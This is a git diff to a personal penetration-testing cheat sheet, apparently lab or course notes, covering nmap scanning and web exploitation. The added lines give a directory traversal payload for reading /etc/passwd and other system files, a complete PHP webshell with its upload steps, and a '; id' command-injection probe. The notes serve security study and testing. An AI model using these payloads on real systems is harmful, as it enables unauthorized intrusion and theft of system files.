@@ -35,12 +35,69 @@ for i in {1..254}; do (ping -c 1 <first.three.oct>.$i | grep "bytes from" &) 2> 
 2) Host Enumeration
 nmap <ip> -p- -T4   # quick scans all ports, use -Pn when using proxychains
 3) Host Interrogation
-nmap <ip> -Pn -T4 -sV -p <port>   # grabs version of service on ports for service validation
+nmap <ip> -Pn -T4 -sV -p <ports>   # grabs version of service on ports for service validation, or use --script=banner.nse instead of -sV
 
 ## nmap scripts
 cat /usr/share/nmap/scripts/<scriptName>    # shows more information on script
 nmap -Pn -T4 <ip> --script=<scriptName> -p <ports>    # runs a nmap script
 nmap -Pn -T4 <ip> --script="<catName>" -p <ports>    # runs all nmap scripts that have the "catName" catagory
+
+
+###### Web Exploitation
+
+GET = Request info
+POST = sending info (i.e. login creds)
+
+# f12 to open dev window when on a web page
+# can run functons by typing <function>() in the dev console
+
+wget -r -l2 -P /tmp <ip>   # -r=recursive, -l2=2 levels deep, -P=copy to location
+curl -o example.html http://www.website.com/    # specify different destination name
+
+# good nmap http scripts: hht-enum.nse, http-robots.txt.nse
+
+# robots.txt shows webcrawlers what and what not to index, lists posible web directories
+
+nikto -h <ip>   # shows web directories that exist
+
+## Directory Traversal
+../../../../../../../../etc/passwd    # typed into searchboxes to try to navigate to root and then to desired directory
+# dirs to try: 
+/etc/passwd   # user information: loginshell (i.e. /bin/bash), home dir location (i.e. /root)
+/etc/group    # user groups: root, adm, sudo (the good ones)
+/etc/hosts    # ip's that hosts are maped to: shows ip's of interest(i.e. 192.168.18.1 webserver)
+/etc/resolv.conf    # DNS server: shows ip networks we can scan for
+/etc/networks   # 
+
+# in dev console under 'network' under header of get request:
+  myfile
+	  somestuff
+  submit
+	  File look up
+# does directory travel in one line: 
+http://10.50.34.135/siteWithSearchbar.php?myfile=../../../../../etc/passwd&submit=File+look+up
+
+## Malicious File Upload (Webshell)
+# must be able to upload, file extensions must not be sanitized, must be able to access upload directory
+
+nano webshell.php
+  <HTML><BODY>
+  <Form METHOD="GET" NAME="badform" ACTION="">
+  <INPUT TYPE="text" NAME="cmd">
+  <INPUT TYPE="submit" VALUE="hello">
+  </Form>
+  <?php system($_GET['cmd']);?>
+  </BODY></HTML>
+
+# upload this file ^ and navigate to "uploads" (or wherever web directory file was uploded to)
+id    # or whoami to see if it worked
+
+## Command Injection
+# for input that run commands
+; id    # enter in searchbar to verify that it works
+
+## SSH Keys
+
 
 
 
